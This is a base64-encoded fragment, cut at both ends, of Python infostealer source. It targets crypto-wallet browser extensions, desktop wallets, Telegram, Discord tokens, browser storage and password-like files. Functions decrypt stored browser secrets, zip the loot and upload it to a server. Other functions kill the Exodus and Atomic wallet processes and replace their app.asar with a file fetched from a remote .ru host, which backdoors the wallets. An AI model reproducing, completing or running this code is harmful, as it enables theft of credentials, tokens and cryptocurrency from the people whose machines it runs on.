cGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xccGRhZGprZmtnY2FmZ2JjZWltY3Bia2FsbmZuZXBibmsifSwKCiAgICB7Im5hbWUiOiAiS2VwbHIiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZG1rYW1ja25vZ2tnY2RmaGhiZGRjZ2hhY2hrZWplYXAifSwKCiAgICB7Im5hbWUiOiAiTGlxdWFsaXR5IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGtwZm9wa2VsbWFwY29pcGVtZmVuZG1kY2dobmVnaW1uIn0sCgogICAgeyJuYW1lIjogIk1FV0NYIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXG5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtIn0sCgogICAgeyJuYW1lIjogIk1haWFyREVGSSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxkbmdtbGJsY29kZm9icGRwZWNhYWRnZmJjZ2dmamZubSJ9LAoKICAgIHsibmFtZSI6ICJNYXJ0aWFuIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGVmYmdsZ29mb2lwcGJnY2plcG5oaWJsYWliY25jbGdrIn0sCgogICAgeyJuYW1lIjogIk1hdGgiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGMifSwKCiAgICB7Im5hbWUiOiAiTWV0YW1hc2siLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4ifSwKCiAgICB7Im5hbWUiOiAiTWV0YW1hc2syIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGVqYmFsYmFrb3BsY2hsZ2hlY2RhbG1lZWVham5pbWhtIn0sCgogICAgeyJuYW1lIjogIk1vYm94IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGZjY2trZGJqbm9pa29vZWRlZGxhcGNhbHBpb25tYWxvIn0sCgogICAgeyJuYW1lIjogIk5hbWkiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcbHBmY2Jqa25panBlZWlsbGlmbmtpa2duY2lrZ2ZoZG8ifSwKCiAgICB7Im5hbWUiOiAiTmlmdHkiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWQifSwKCiAgICB7Im5hbWUiOiAiT3h5Z2VuIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGZoaWxhaGVpbWdsaWduZGRramdvZmtjYmdla2hlbmJoIn0sCgogICAgeyJuYW1lIjogIlBhbGlXYWxsZXQiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcbWdmZmtmYmlkaWhqcG9hb21hamxiZ2NoZGRsaWNncG4ifSwKCiAgICB7Im5hbWUiOiAiUGV0cmEiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZWpqbGFkaW5uY2tkZ2plbWVrZWJkcGVva2Jpa2hmY2kifSwKCiAgICB7Im5hbWUiOiAiUGhhbnRvbSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSJ9LAoKICAgIHsibmFtZSI6ICJQb250ZW0iLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xccGhrYmFtZWZpbmdnbWFrZ2tscGtsamptZ2lib2huYmEifSwKCiAgICB7Im5hbWUiOiAiUm9uaW4iLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZm5qaG1raGhta2Jqa2thYm5kY25ub2dhZ29nYm5lZWMifSwKCiAgICB7Im5hbWUiOiAiU2FmZXBhbCIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYSJ9LAoKICAgIHsibmFtZSI6ICJTYXR1cm4iLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcbmtkZGduY2RqZ2pmY2RkYW1mZ2NtZm5saGNjbmltaWcifSwKCiAgICB7Im5hbWUiOiAiU2xvcGUiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xccG9jbXBscGFjY2FuaG1ubGxiYmtwZ2ZsaWltamxqZ28ifSwKCiAgICB7Im5hbWUiOiAiU29sZmFyZSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYyJ9LAoKICAgIHsibmFtZSI6ICJTb2xsZXQiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZmhtZmVuZGdkb2NtY2JtZmlrZGNvZ29mcGhpbW5rbm8ifSwKCiAgICB7Im5hbWUiOiAiU3RhcmNvaW4iLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcbWZoYmViZ29jbGtnaGViZmZkbGRwb2JlYWptYmVjZmsifSwKCiAgICB7Im5hbWUiOiAiU3dhc2giLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcY21uZGpiZWNpbGJvY2pma2liZmJpZmhuZ2tkbWpnb2cifSwKCiAgICB7Im5hbWUiOiAiVGVtcGxlVGV6b3MiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcb29ramxia2lpamluaHBtbmpmZmNvZmpvbmJmYmdhb2MifSwKCiAgICB7Im5hbWUiOiAiVGVycmFTdGF0aW9uIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGFpaWZibmJmb2JwbWVla2lwaGVlaWppbWRwbmxwZ3BwIn0sCgogICAgeyJuYW1lIjogIlRva2VucG9ja2V0IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXG1mZ2NjamNoaWhma2tpbmRmcHBuYW9vZWNnZm5laWlpIn0sCgogICAgeyJuYW1lIjogIlRvbiIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxucGhwbHBnb2FraGhqY2hra2htaWdnYWtpam5raGZuZCJ9LAoKICAgIHsibmFtZSI6ICJUcm9uIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGlibmVqZGZqbW1rcGNubHBlYmtsbW5rb2VvaWhvZmVjIn0sCgogICAgeyJuYW1lIjogIlRydXN0IFdhbGxldCIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaCJ9LAoKICAgIHsibmFtZSI6ICJXb21iYXQiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcYW1rbWpqbW1mbGRkb2dtaHBqbG9pbWlwYm9mbmZqaWgifSwKCiAgICB7Im5hbWUiOiAiWERFRkkiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcaG1lb2JuZm5mY21ka2RjbWxibGdhZ21mcGZib2llYWYifSwKCiAgICB7Im5hbWUiOiAiWE1SLlBUIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGVpZ2JsYmdqa25sZmJhamtmaG9wbWNvamlkbGdjZWhtIn0sCgogICAgeyJuYW1lIjogIlhpblBheSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxib2Nwb2tpbWljY2xwYWlla2VuYWVlbGVoZGpsbG9mbyJ9LAoKICAgIHsibmFtZSI6ICJZb3JvaSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYiJ9LAoKICAgIHsibmFtZSI6ICJpV2FsbGV0IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGtuY2NoZGlnb2JnaGVuYmJhZGRvampubmFvZ2ZwcGZqIn0KCl0KCgoKV0FMTEVUX1BBVEhTID0gWwoKICAgIHsibmFtZSI6ICJBdG9taWMiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiYXRvbWljIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiRXhvZHVzIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oQVBQREFUQSwgIkV4b2R1cyIsICJleG9kdXMud2FsbGV0Iil9LAoKICAgIHsibmFtZSI6ICJFbGVjdHJ1bSIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJFbGVjdHJ1bSIsICJ3YWxsZXRzIil9LAoKICAgIHsibmFtZSI6ICJFbGVjdHJ1bS1MVEMiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiRWxlY3RydW0tTFRDIiwgIndhbGxldHMiKX0sCgogICAgeyJuYW1lIjogIlpjYXNoIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oQVBQREFUQSwgIlpjYXNoIil9LAoKICAgIHsibmFtZSI6ICJBcm1vcnkiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiQXJtb3J5Iil9LAoKICAgIHsibmFtZSI6ICJCeXRlY29pbiIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJieXRlY29pbiIpfSwKCiAgICB7Im5hbWUiOiAiSmF4eCIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJjb20ubGliZXJ0eS5qYXh4IiwgIkluZGV4ZWREQiIsICJmaWxlX18wLmluZGV4ZWRkYi5sZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJFdGhlcml1bSIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJFdGhlcmV1bSIsICJrZXlzdG9yZSIpfSwKCiAgICB7Im5hbWUiOiAiR3VhcmRhIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oQVBQREFUQSwgIkd1YXJkYSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkNvaW5vbWkiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiQ29pbm9taSIsICJDb2lub21pIiwgIndhbGxldHMiKX0sCgogICAgeyJuYW1lIjogIlRlbGVncmFtIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oQVBQREFUQSwgIlRlbGVncmFtIERlc2t0b3AiLCAidGRhdGEiKX0sCgpdCgoKClBBVEhTX1RPX1NFQVJDSCA9IFsKCiAgICBVU0VSX1BST0ZJTEUgKyAiXFxEZXNrdG9wIiwKCiAgICBVU0VSX1BST0ZJTEUgKyAiXFxEb2N1bWVudHMiLAoKICAgIFVTRVJfUFJPRklMRSArICJcXERvd25sb2FkcyIsCgogICAgVVNFUl9QUk9GSUxFICsgIlxcT25lRHJpdmVcXERvY3VtZW50cyIsCgogICAgVVNFUl9QUk9GSUxFICsgIlxcT25lRHJpdmVcXERlc2t0b3AiLAoKXQoKCgpGSUxFX0tFWVdPUkRTID0gWwoKICAgICAgICAicGFzc3ciLAoKICAgICAgICAibWRwIiwKCiAgICAgICAgIm1vdGRlcGFzc2UiLAoKICAgICAgICAibW90X2RlX3Bhc3NlIiwKCiAgICAgICAgImxvZ2luIiwKCiAgICAgICAgInNlY3JldCIsCgogICAgICAgICJhY2NvdW50IiwKCiAgICAgICAgImFjb3VudCIsCgogICAgICAgICJwYXlwYWwiLAoKICAgICAgICAiYmFucXVlIiwKCiAgICAgICAgIm1ldGFtYXNrIiwKCiAgICAgICAgIndhbGxldCIsCgogICAgICAgICJjcnlwdG8iLAoKICAgICAgICAiZXhvZHVzIiwKCiAgICAgICAgImRpc2NvcmQiLAoKICAgICAgICAiMmZhIiwKCiAgICAgICAgImNvZGUiLAoKICAgICAgICAibWVtbyIsCgogICAgICAgICJjb21wdGUiLAoKICAgICAgICAidG9rZW4iLAoKICAgICAgICAiYmFja3VwIiwKCiAgICAgICAgInNlZWNyZXQiCgpdCgoKCkFMTE9XRURfRVhURU5TSU9OUyA9IFsKCiAgICAiLnR4dCIsCgogICAgIi5sb2ciLAoKICAgICIuZG9jIiwKCiAgICAiLmRvY3giLAoKICAgICIueGxzIiwKCiAgICAiLnhsc3giLAoKICAgICIucHB0IiwKCiAgICAiLnBwdHgiLAoKICAgICIub2R0IiwKCiAgICAiLnBkZiIsCgogICAgIi5ydGYiLAoKICAgICIuanNvbiIsCgogICAgIi5jc3YiLAoKICAgICIuZGIiLAoKICAgICIuanBnIiwKCiAgICAiLmpwZWciLAoKICAgICIucG5nIiwKCiAgICAiLmdpZiIsCgogICAgIi53ZWJwIiwKCiAgICAiLm1wNCIKCl0KCgoKRElTQ09SRF9QQVRIUyA9IFsKCiAgICB7Im5hbWUiOiAiRGlzY29yZCIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJkaXNjb3JkIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiRGlzY29yZCBDYW5hcnkiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiZGlzY29yZGNhbmFyeSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkRpc2NvcmQgUFRCIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oQVBQREFUQSwgImRpc2NvcmRwdGIiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJPcGVyYSIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBTdGFibGUiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJPcGVyYSBHWCIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBHWCBTdGFibGUiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJBbWlnbyIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkFtaWdvIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIlRvcmNoIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiVG9yY2giLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiS29tZXRhIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiS29tZXRhIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIk9yYml0dW0iLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJPcmJpdHVtIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkNlbnRCcm93c2VyIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiQ2VudEJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiN1N0YXIiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICI3U3RhciIsICI3U3RhciIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJTcHV0bmlrIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiU3B1dG5payIsICJTcHV0bmlrIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIlZpdmFsZGkiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJWaXZhbGRpIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiQ2hyb21lIFN4UyIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkdvb2dsZSIsICJDaHJvbWUgU3hTIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkNocm9tZSIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJDaHJvbWUxIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiLCAiUHJvZmlsZSAxIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiQ2hyb21lMiIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIlByb2ZpbGUgMiIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkNocm9tZTMiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJQcm9maWxlIDMiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJDaHJvbWU0IiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiLCAiUHJvZmlsZSA0IiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiQ2hyb21lNSIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIlByb2ZpbGUgNSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIkVwaWMgUHJpdmFjeSBCcm93c2VyIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiRXBpYyBQcml2YWN5IEJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiTWljcm9zb2Z0IEVkZ2UiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIlVyYW4iLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJ1Q296TWVkaWEiLCAiVXJhbiIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0sCgogICAgeyJuYW1lIjogIllhbmRleCIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIllhbmRleCIsICJZYW5kZXhCcm93c2VyIiwgIlVzZXIgRGF0YSIsICJEZWZhdWx0IiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpfSwKCiAgICB7Im5hbWUiOiAiQnJhdmUiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJCcmF2ZVNvZnR3YXJlIiwgIkJyYXZlLUJyb3dzZXIiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIil9LAoKICAgIHsibmFtZSI6ICJJcmlkaXVtIiwgInBhdGgiOiBvcy5wYXRoLmpvaW4oTE9DQUxBUFBEQVRBLCAiSXJpZGl1bSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKX0KCl0KCkRJU0NPUkRfVE9LRU5TID0gW10KClBBU1NXT1JEUyA9IFtdCgpDT09LSUVTID0gW10KCldFQl9EQVRBID0gW10KCkRJU0NPUkRfSURTID0gW10KCgoKCgpkZWYgZGVjcnlwdF9kYXRhKGRhdGEsIGtleSk6CgogICAgdHJ5OgoKICAgICAgICBpdiA9IGRhdGFbMzoxNV0KCiAgICAgICAgZGF0YSA9IGRhdGFbMTU6XQoKICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikKCiAgICAgICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KGRhdGEpWzotMTZdLmRlY29kZSgpCgogICAgZXhjZXB0OgoKICAgICAgICByZXR1cm4gc3RyKHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKHBhc3N3b3JkLCBOb25lLCBOb25lLCBOb25lLCAwKVsxXSkKCgoKCgpkZWYgemlwX3RvX3N0b3JhZ2UobmFtZSwgc291cmNlLCBkZXN0aW5hdGlvbik6CgogICAgaWYgb3MucGF0aC5pc2ZpbGUoc291cmNlKToKCiAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoZGVzdGluYXRpb24gKyBmIlxce25hbWV9LnppcCIsICJ3IikgYXMgejoKCiAgICAgICAgICAgIHoud3JpdGUoc291cmNlLCBvcy5wYXRoLmJhc2VuYW1lKHNvdXJjZSkpCgogICAgZWxzZToKCiAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoZGVzdGluYXRpb24gKyBmIlxce25hbWV9LnppcCIsICJ3IikgYXMgejoKCiAgICAgICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHNvdXJjZSk6CgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CgogICAgICAgICAgICAgICAgICAgIHoud3JpdGUob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBvcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBvcy5wYXRoLmpvaW4oc291cmNlLCAnLi4nKSkpCgoKCgoKCmRlZiB1cGxvYWRfdG9fc2VydmVyKGZpbGVwYXRoKToKICAgIAoKICAgIGZvciBpIGluIHJhbmdlKDEwKToKCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSB1cmxfCgogICAgICAgICAgICBmaWxlcyA9IHsnZmlsZSc6IG9wZW4oZmlsZXBhdGgsICdyYicpfQoKICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykKCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgoKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgIGV4Y2VwdDogcGFzcwoKCgoKZGVmIHZhbGlkYXRlX2Rpc2NvcmRfdG9rZW4odG9rZW4pOgoKICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIsIGhlYWRlcnM9eyJBdXRob3JpemF0aW9uIjogdG9rZW59KQoKICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgoKICAgICAgICByZXR1cm4gci5qc29uKCkKCiAgICBlbHNlOgoKICAgICAgICByZXR1cm4gTm9uZQoKCgoKCmRlZiB0YXNra2lsbCh0YXNrbmFtZSk6CgogICAgc3VicHJvY2Vzcy5ydW4oWyJ0YXNra2lsbCIsICIvRiIsICIvSU0iLCB0YXNrbmFtZV0sIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCgoKCmRlZiBpbmplY3QoKToKCiAgICBwcm9jYyA9ICJleG9kdXMuZXhlIgoKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQoKICAgIHBhdGggPSBmIntsb2NhbH0vZXhvZHVzIgoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKCiAgICBhcHBzID0gW10KCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgoKICAgICAgICBpZiAiYXBwLSIgaW4gZmlsZToKCiAgICAgICAgICAgIGFwcHMgKz0gW2ZpbGVdCgogICAgZXhvZHVzUGF0Y2hVUkwgPSAiaHR0cHM6Ly9kaWVzZXJiZW5uaS5ydS9hcHAuYXNhciIKCiAgICBoZWFkZXJzID0geyJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OS4wLjQzODkuODIgU2FmYXJpLzUzNy4zNiJ9CgogICAgcmVxID0gUmVxdWVzdChleG9kdXNQYXRjaFVSTCwgaGVhZGVycz1oZWFkZXJzKQoKICAgIHJlc3BvbnNlID0gdXJsb3BlbihyZXEpCgogICAgZGF0YSA9IHJlc3BvbnNlLnJlYWQoKQoKICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIGZvciBhcHAgaW4gYXBwczoKCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgZnVsbHBhdGggPSBmIntwYXRofS97YXBwfS9yZXNvdXJjZXMvYXBwLmFzYXIiCgogICAgICAgICAgICB3aXRoIG9wZW4oZnVsbHBhdGgsICd3YicpIGFzIG91dF9maWxlMToKCiAgICAgICAgICAgICAgICBvdXRfZmlsZTEud3JpdGUoZGF0YSkKCiAgICAgICAgZXhjZXB0OiBwYXNzCgoKCmZvciBpIGluIHJhbmdlKDEwKToKCiAgICB0cnk6CgogICAgICAgIGluamVjdCgpCgogICAgICAgIGJyZWFrCgogICAgZXhjZXB0OiBwYXNzCgpkZWYgaW5qZWN0X2F0b21pYygpOgoKICAgIHByb2NjID0gIkF0b21pYyBXYWxsZXQuZXhlIgoKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQoKICAgIHBhdGggPSBmIntsb2NhbH0vUHJvZ3JhbXMvYXRvbWljIgoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgYXRvbWljUGF0Y2hVUkwgPSAiaHR0cHM6Ly9kaWVzZXJiZW5uaS5ydS9hdG9taWMvYXBwLmFzYXIiCgogICAgaGVhZGVycyA9IHsiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCJ9CgogICAgcmVxID0gUmVxdWVzdChhdG9taWNQYXRjaFVSTCwgaGVhZGVycz1oZWFkZXJzKQoKICAgIHJlc3BvbnNlID0gdXJsb3BlbihyZXEpCgogICAgZGF0YSA9IHJlc3BvbnNlLnJlYWQoKQoKICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIHRyeToKCiAgICAgICAgZnVsbHBhdGggPSBmIntwYXRofS9yZXNvdXJjZXMvYXBwLmFzYXIiCgogICAgICAgIHdpdGggb3BlbihmdWxscGF0aCwgJ3diJykgYXMgb3V0X2ZpbGUxOgoKICAgICAgICAgICAgb3V0X2ZpbGUxLndyaXRlKGRhdGEpCgogICAgZXhjZXB0OiBwYXNzCgpmb3IgaSBpbiByYW5nZSgxMCk6CgogICAgdHJ5OgoKICAgICAgI